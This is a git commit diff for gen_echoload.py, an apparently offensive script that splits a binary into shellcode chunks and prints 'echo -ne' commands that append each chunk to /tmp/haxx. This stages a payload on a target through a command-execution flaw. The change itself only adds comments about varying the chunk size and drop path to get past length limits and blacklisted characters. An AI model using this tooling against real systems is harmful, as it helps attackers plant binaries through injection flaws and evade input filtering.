62fc66e731acb27392d8c77577ab64e8ca6579f2
darrenmartyn <49643587+darrenmartyn@users.noreply.github.com>
2019-11-05 20:00:10 +0100

    Update gen_echoload.py

--- gen_echoload.py
+++ gen_echoload.py
@@ -10,11 +10,11 @@ def main(args):
     if len(args) != 2:
         sys.exit("%s file_to_drop.bin" %(args[0]))
     shellcode = gen_shellcode(binaryfile=args[1])
-    n = 700
+    n = 700 # this will need to vary, as various command exec things may have length restrictions
     blobs = [shellcode[i:i+n] for i in range(0, len(shellcode), n)]
     num_blobs = len(blobs)
     for blob in blobs:
-        print "echo -ne '%s' >> /tmp/haxx" %(blob)
+        print "echo -ne '%s' >> /tmp/haxx" %(blob) # vary this too - final path, maybe chars are blacklisted?
 
 if __name__ == "__main__":
     main(args=sys.argv)
